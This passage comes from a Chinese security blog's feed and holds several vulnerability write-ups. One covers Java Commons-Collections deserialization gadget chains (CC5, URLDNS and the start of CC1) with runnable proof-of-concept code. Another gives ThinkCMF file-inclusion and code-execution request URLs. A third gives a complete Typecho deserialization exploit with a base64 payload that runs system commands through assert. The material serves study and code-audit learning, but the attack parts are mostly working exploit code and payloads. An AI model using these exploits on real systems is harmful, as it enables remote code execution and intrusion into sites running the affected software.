class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;</span><br><span class="line">        ChainedTransformer chain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span>&#125;)&#125;);</span><br><span class="line">        HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);</span><br><span class="line">        TiedMapEntry tiedmap = <span class="keyword">new</span> TiedMapEntry(map,<span class="string">"y3m"</span>);</span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="number">1</span>);</span><br><span class="line">        Field val = Class.forName(<span class="string">"javax.management.BadAttributeValueExpException"</span>).getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        val.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./cc5"</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./cc5"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面依然是利用ChainedTransformer来执行命令，在前面利用了HashMap的get方法来触发后续的调用链</p><p><img src="/2020/12/03/再探CommonsCollections利用链/1.png" alt="1"></p><p>接着需要寻找触发HashMap的get方法的点，在这里利用到了TiedMapEntry类</p><p><img src="/2020/12/03/再探CommonsCollections利用链/2.png" alt="2"></p><p>在该类中的toString方法调用了getValue方法</p><p><img src="/2020/12/03/再探CommonsCollections利用链/3.png" alt="3"></p><p>接着来寻找触发TiedMapEntry类的toString的点，这里利用到了BadAttributeValueExpException类</p><p><img src="/2020/12/03/再探CommonsCollections利用链/4.png" alt="4"></p><p>该类的readObject方法会调用toString方法，在这里需要满足如下条件</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>get<span class="constructor">SecurityManager()</span><span class="operator"> == </span>null</span><br></pre></td></tr></table></figure><p>SecurityManager是java安全管理器，描述如下</p><p><img src="/2020/12/03/再探CommonsCollections利用链/5.png" alt="5"></p><p>该管理器默认是关闭的，意味着默认可以执行到toString方法</p><p>调用链如下</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="module-access"><span class="module"><span class="identifier">BadAttributeValueExpException</span>.</span></span>readObject-&gt;<span class="module-access"><span class="module"><span class="identifier">TiedMapEntry</span>.</span></span>toString</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get-&gt;<span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">ConstantTransformer</span>.</span></span>transform-&gt;<span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke-&gt;<span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>getMethod</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform-&gt;<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>getRuntime-&gt; <span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform</span><br><span class="line">-&gt;<span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke-&gt;<span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://www.anquanke.com/post/id/220697" target="_blank" rel="noopener">https://www.anquanke.com/post/id/220697</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;再次温习一下CC链&lt;/p&gt;
&lt;h2 id=&quot;CommonsCollections5&quot;&gt;&lt;a href=&quot;#CommonsCollections5&quot; class=&quot;headerlink&quot; title=&quot;CommonsCollections5&quot;&gt;&lt;/a&gt;CommonsColle
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkCMF文件包含与远程代码执行分析</title>
    <link href="https://yml-sec.top/2020/11/30/ThinkCMF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2020/11/30/ThinkCMF%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%86%E6%9E%90/</id>
    <published>2020-11-30T01:44:26.000Z</published>
    <updated>2020-11-30T02:42:07.798Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><blockquote><p>ThinkCMF X1.6.0<br>ThinkCMF X2.1.0<br>ThinkCMF X2.2.0<br>ThinkCMF X2.2.1<br>ThinkCMF X2.2.2<br>ThinkCMF X2.2.3</p></blockquote><p>本文使用2.2.3进行分析，下载链接：<a href="https://www.mycodes.net/45/7058.htm" target="_blank" rel="noopener">https://www.mycodes.net/45/7058.htm</a></p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>首先来到默认控制器，位于<code>\application\Portal\Controller\IndexController.class.php</code>，代码如下</p><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/1.jpg" alt="1"></p><p>跟进<code>HomebaseController</code>控制器，其中存在许多<code>public</code>属性的方法，我们可以在前台直接调用，该处漏洞利用了<code>display</code>方法</p><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/2.jpg" alt="2"></p><p>该方法中的五个参数都是可控的，第一个参数被传入到了<code>parseTemplate</code>方法中，跟进该方法</p><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/3.jpg" alt="3"></p><p>如果文件存在，会直接返回文件名，在这里我们控制该参数为想包含的文件即可</p><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>该处调用到了<code>HomebaseController</code>中的fetch方法，代码如下</p><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/5.jpg" alt="5"></p><p>该方法调用了父类中的fetch方法，跟进该方法</p><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/6.jpg" alt="6"></p><p>继续跟进</p><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/7.jpg" alt="7"></p><p>该处存在着代码执行的点，我们只要控制<code>content</code>的值即可</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a>文件包含</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//cmf.io/index.php?a=display&amp;templateFile=config.yaml</span></span><br></pre></td></tr></table></figure><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/8.jpg" alt="8"></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//cmf.io/index.php?a=fetch&amp;content=<span class="meta">&lt;?php</span> phpinfo();exit();<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/11/30/ThinkCMF文件包含与远程代码执行分析/9.jpg" alt="9"></p><p>注意要使用exit函数中段代码执行，否则不会进行输出</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;ThinkCMF X1.6.0&lt;br&gt;ThinkCMF X2.1.0&lt;br&gt;ThinkCMF X2
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>typecho反序列化分析</title>
    <link href="https://yml-sec.top/2020/11/19/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>https://yml-sec.top/2020/11/19/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/</id>
    <published>2020-11-19T02:09:49.000Z</published>
    <updated>2020-11-19T03:04:16.359Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上周<code>hxb</code>决赛攻防模式碰见了该套程序，正好没跟过该套程序的反序列化链，漏洞虽然比较老，但很有学习的价值，在这里记录一下；<code>hxb</code>排了<code>11</code>，小遗憾。</p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>漏洞触发点位于<code>install.php</code>，代码段如下</p><p><img src="/2020/11/19/typecho反序列化分析/1.jpg" alt="1"></p><p><code>230</code>行处取出<code>cookie</code>值进行了反序列化操作，接着在<code>232</code>行创建了<code>Typecho_Db</code>类的实例，我们来到位于<code>\var\Typecho\Db.php</code>的<code>Typecho_Db</code>类中，在该类的构造方法中存在着如下代码段</p><p><img src="/2020/11/19/typecho反序列化分析/2.jpg" alt="2"></p><p>在<code>120</code>行处存在着字符串的操作，同时<code>$adapterName</code>是可控的，在这里我们可以控制触发任意类的<code>__toString</code>方法，在这里选择位于<code>\var\Typecho\Feed.php</code>中的<code>Typecho_Feed</code>类，重要代码如下</p><p><img src="/2020/11/19/typecho反序列化分析/3.jpg" alt="3"></p><p>在<code>290</code>行存在着<code>$item[&#39;author&#39;]-&gt;screenName</code>，其中<code>$item[&#39;author&#39;]</code>可控，那么在这里我们就可以触发任意不存在<code>screenName</code>属性的类的<code>__get</code>方法，在这里选择<code>\var\Typecho\Request.php</code>中的<code>Typecho_Request</code>类</p><p><img src="/2020/11/19/typecho反序列化分析/4.jpg" alt="4"></p><p>跟进<code>__get</code>方法</p><p><img src="/2020/11/19/typecho反序列化分析/5.jpg" alt="5"></p><p>该处的<code>$value</code>可控，最后会触发<code>_applyFilter</code>方法，跟进该方法</p><p><img src="/2020/11/19/typecho反序列化分析/6.jpg" alt="6"></p><p>该方法中存在着<code>array_map</code>与<code>call_user_func</code>，且参数均可控，符合代码执行的条件，在这里选择使用<code>call_user_func</code>，即可触发代码执行，接着梳理一下调用链</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unserialize</span><br><span class="line"><span class="function">-&gt;</span>Typecho_Db(__construct)</span><br><span class="line"><span class="function">-&gt;</span>Typecho_Feed(__toString)</span><br><span class="line"><span class="function">-&gt;</span>Typecho_Request(__get)</span><br><span class="line"><span class="function">-&gt;</span>Typecho_Request(get)</span><br><span class="line"><span class="function">-&gt;</span>Typecho_Request(_applyFilter)</span><br><span class="line"><span class="function">-&gt;</span>call_user_func</span><br></pre></td></tr></table></figure><h1 id="细节补充"><a href="#细节补充" class="headerlink" title="细节补充"></a>细节补充</h1><p>1.在实际利用漏洞的过程中，出现了500错误，猜测是程序内部在运行payload时捕获到了异常从而清除了回显，通过在执行代码时刻意添加exit，解决了该问题</p><p>2.漏洞的利用代码需要通过设置cookie键值传递，在查看获取cookie的代码段时，发现获取cookie建值也可以使用POST方法</p><p><img src="/2020/11/19/typecho反序列化分析/7.jpg" alt="7"></p><p>3.漏洞触发需要绕过<code>install.php</code>中的两个<code>if</code>判断</p><p><img src="/2020/11/19/typecho反序列化分析/8.jpg" alt="8"></p><p>在这里我们需要来传递<code>finish</code>参数同时添加<code>referer</code>头为本站链接来绕过校验</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>编写exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_params = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_params = <span class="keyword">array</span>(<span class="string">"screenName"</span>=&gt;<span class="string">"eval('system('whoami');exit;')"</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_filter = <span class="keyword">array</span>(<span class="string">"assert"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> $_type;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_type = <span class="string">"RSS 2.0"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_items = <span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">"title"</span>=&gt;<span class="string">"hello"</span>,<span class="string">"link"</span>=&gt;<span class="string">"world"</span>,<span class="string">"date"</span>=&gt;<span class="string">"20201118"</span>,<span class="string">"author"</span>=&gt;(<span class="keyword">new</span> Typecho_Request())));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Typecho_Feed();</span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"adapter"</span>=&gt;$a,<span class="string">"prefix"</span>=&gt;<span class="string">"typecho_"</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($arr));</span><br><span class="line"><span class="comment">//YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6NDp7czo1OiJ0aXRsZSI7czo1OiJoZWxsbyI7czo0OiJsaW5rIjtzOjU6IndvcmxkIjtzOjQ6ImRhdGUiO3M6ODoiMjAyMDExMTgiO3M6NjoiYXV0aG9yIjtPOjE1OiJUeXBlY2hvX1JlcXVlc3QiOjI6e3M6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO31zOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czozMjoiZXZhbCgnc3lzdGVtKFwnd2hvYW1pXCcpO2V4aXQ7JykiO319fX1zOjE5OiIAVHlwZWNob19GZWVkAF90eXBlIjtzOjc6IlJTUyAyLjAiO31zOjY6InByZWZpeCI7czo4OiJ0eXBlY2hvXyI7fQ==</span></span><br></pre></td></tr></table></figure><p>发送<code>payload</code></p><p><img src="/2020/11/19/typecho反序列化分析/9.jpg" alt="9"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;上周&lt;code&gt;hxb&lt;/code&gt;决赛攻防模式碰见了该套程序，正好没跟过该套程序的反序列化链，漏洞虽然比较老，但很有学习的价值，在这里记录
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="https://yml-sec.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>java反序列化漏洞学习记录</title>
    <link href="https://yml-sec.top/2020/07/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>https://yml-sec.top/2020/07/06/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2020-07-06T12:26:50.000Z</published>
    <updated>2020-07-11T03:03:10.925Z</updated>
    
    <content type="html"><![CDATA[<p>对近期java反序列化漏洞学习做个记录</p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.test.mytest;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://srpt8e.dnslog.cn"</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(url, <span class="number">0xaaaabbbb</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">"hello"</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"temp.bin"</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"temp.bin"</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        System.out.println(<span class="string">"called"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试下查看利用链</p><p>首先来到<code>HashMap</code>类中的<code>readObject</code>方法，其中调用了<code>putVal</code>方法</p><p><img src="/2020/07/06/java反序列化漏洞学习记录/1.png" alt="1"></p><p>该方法中调用了<code>hash</code>方法</p><p><img src="/2020/07/06/java反序列化漏洞学习记录/2.png" alt="2"></p><p>接着调用了<code>hashCode</code>方法</p><p><img src="/2020/07/06/java反序列化漏洞学习记录/3.png" alt="3"></p><p>接着调用了<code>URLStreamHandler</code>类中的<code>hashCode</code>方法</p><p><img src="/2020/07/06/java反序列化漏洞学习记录/4.png" alt="4"></p><p>接着调用了<code>URLStreamHandler</code>类中的<code>getHostAddress</code>方法</p><p><img src="/2020/07/06/java反序列化漏洞学习记录/5.png" alt="5"></p><p>接着调用了<code>getByName</code>方法，该方法是用来在给定主机名的情况下确定主机的IP地址的，也就意味着执行了一次<code>DNS</code>查询，在<code>DNSLOG</code>平台上确实也留下了查询记录</p><p><img src="/2020/07/06/java反序列化漏洞学习记录/7.png" alt="7"></p><p>最后总结下链的触发过程</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="params">(HashMap)</span>-&gt;</span>readObject-&gt;putVal-&gt;hash</span><br><span class="line"><span class="function"><span class="params">(URL)</span>-&gt;</span>hashCode</span><br><span class="line"><span class="function"><span class="params">(URLStreamHandler)</span>-&gt;</span>hashCode-&gt;getHostAddress</span><br><span class="line"><span class="function"><span class="params">(InetAddress)</span>-&gt;</span>getByName</span><br></pre></td></tr></table></figure><h1 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h1><p>使用<code>ysoserial</code>中的<code>payload</code>进行分析，<code>payload</code>中给出了利用链</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">ObjectInputStream</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="constructor">Object()</span></span><br><span class="line"><span class="constructor">Map(Proxy)</span>.entry<span class="constructor">Set()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">LazyMap</span>.</span></span>get<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">ChainedTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">ConstantTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Class</span>.</span></span>get<span class="constructor">Method()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>get<span class="constructor">Runtime()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">InvokerTransformer</span>.</span></span>transform<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Method</span>.</span></span>invoke<span class="literal">()</span></span><br><span class="line"><span class="module-access"><span class="module"><span class="identifier">Runtime</span>.</span></span>exec<span class="literal">()</span></span><br></pre></td></tr></table></figure><p>接着我们来跟一下这条链，首先看一下<code>poc</code>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                